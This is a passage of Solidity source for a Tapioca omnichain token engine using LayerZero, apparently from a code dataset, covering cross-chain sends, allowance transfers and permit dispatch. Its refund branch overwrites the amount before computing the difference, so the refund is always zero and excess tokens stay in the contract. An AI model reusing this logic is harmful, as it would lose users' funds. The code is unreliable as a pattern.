amount to credit with the amount debited and send the difference back to the user.\n        if (_lzSendParam.sendParam.amountLD > amountDebitedLD_) {\n            // Overwrite the amount to credit with the amount debited\n            _lzSendParam.sendParam.amountLD = amountDebitedLD_;\n            _lzSendParam.sendParam.minAmountLD = amountDebitedLD_;\n            // Send the difference back to the user\n            _transfer(address(this), _srcChainSender, _lzSendParam.sendParam.amountLD - amountDebitedLD_);\n        }\n\n        // Builds the options and OFT message to quote in the endpoint.\n        (bytes memory message, bytes memory options) = _buildOFTMsgAndOptionsMemory(\n            _lzSendParam.sendParam, _lzSendParam.extraOptions, _composeMsg, amountToCreditLD_, _srcChainSender\n        ); // msgSender is the sender of the composed message. We keep context by passing `_srcChainSender`.\n\n        // Sends the message to the LayerZero endpoint and returns the LayerZero msg receipt.\n        msgReceipt =\n            _lzSend(_lzSendParam.sendParam.dstEid, message, options, _lzSendParam.fee, _lzSendParam.refundAddress);\n        // Formulate the OFT receipt.\n        oftReceipt = OFTReceipt(amountDebitedLD_, amountToCreditLD_);\n\n        emit OFTSent(msgReceipt.guid, _lzSendParam.sendParam.dstEid, _srcChainSender, amountDebitedLD_);\n    }\n\n    /**\n     * @dev Performs a transfer with an allowance check and consumption against the xChain msg sender.\n     * @dev Can only transfer to this address.\n     *\n     * @param _owner The account to transfer from.\n     * @param srcChainSender The address of the sender on the source chain.\n     * @param _amount The amount to transfer\n     */\n    function _internalTransferWithAllowance(address _owner, address srcChainSender, uint256 _amount) internal {\n        if (_owner != srcChainSender) {\n            _spendAllowance(_owner, srcChainSender, _amount);\n        }\n\n        _transfer(_owner, address(this), _amount);\n    }\n\n    /**\n     * @notice Sends a permit/approval call to the `tapiocaOmnichainReceiveExtender` contract.\n     * @param _msgType The type of the message.\n     * @param _data The call data containing info about the message.\n     * @return success is the success of the composed message handler. If no handler is found, it should return false to trigger `InvalidMsgType()`.\n     */\n    function _extExec(uint16 _msgType, bytes memory _data) internal returns (bool) {\n        if (_msgType == MSG_APPROVALS) {\n            toeExtExec.erc20PermitApproval(_data);\n        } else if (_msgType == MSG_NFT_APPROVALS) {\n            toeExtExec.erc721PermitApproval(_data);\n        } else if (_msgType == MSG_PEARLMIT_APPROVAL) {\n            toeExtExec.pearlmitApproval(_data);\n        } else if (_msgType == MSG_YB_APPROVE_ALL) {\n            toeExtExec.yieldBoxPermitAll(_data);\n        } else if (_msgType == MSG_YB_APPROVE_ASSET) {\n            toeExtExec.yieldBoxPermitAsset(_data);\n        } else if (_msgType == MSG_MARKET_PERMIT) {\n            toeExtExec.marketPermit(_data);\n        } else {\n            return false;\n        }\n        return true;\n    }\n\n    // ***************** //\n    // ***** UTILS ***** //\n    // ***************** //\n\n    /**\n     * @dev For details about this function, check `BaseTapiocaOmnichainEngine._buildOFTMsgAndOptions()`.\n     * @dev !!!! IMPORTANT !!!! The differences are:\n     *      - memory instead of calldata for parameters.\n     *      - `_msgSender` is used instead of using context `msg.sender`, to preserve context of the OFT call and use `msg.sender` of the source chain.\n     *      - Does NOT combine options, make sure to pass valid options to cover gas costs/value transfers.\n     */\n    function _buildOFTMsgAndOptionsMemory(\n        SendParam memory _sendParam,\n        bytes memory _extraOptions,\n        bytes memory _composeMsg,\n        uint256 _amountToCreditLD,\n        address _msgSender\n    ) internal view returns (bytes memory message, bytes memory options) {\n        bool hasCompose = _composeMsg.length > 0;\n\n        message = hasCompose\n            ? abi.encodePacked(\n                _sendParam.to, _toSD(_amountToCreditLD), OFTMsgCodec.addressToBytes32(_msgSender), _composeMsg\n            )\n            : abi.encodePacked(_sendParam.to, _toSD(_amountToCreditLD));\n        options = _extraOptions;\n\n        if (msgInspector != address(0)) {\n            IOAppMsgInspector(msgInspector).inspect(message, options);\n        }\n    }\n\n    /**\n     * @notice Return the revert message from an external call.\n     * @param _returnData The return data from the external call.\n     */\n    function _getTOEExtenderRevertMsg(bytes memory _returnData) internal pure returns (string memory) {\n        if (_returnData.length > 1000) return \"Module: reason too long\";\n\n        // If the _res length is less than 68, then the transaction failed silently (without a revert message)\n        if (_returnData.length < 68) return \"Module: data\";\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            // Slice the sighash.\n            _returnData := add(_returnData, 0x04)\n        }\n        return abi.decode(_returnData, (string)); // All that remains is the revert string\n    }\n}"
    }
  ]
}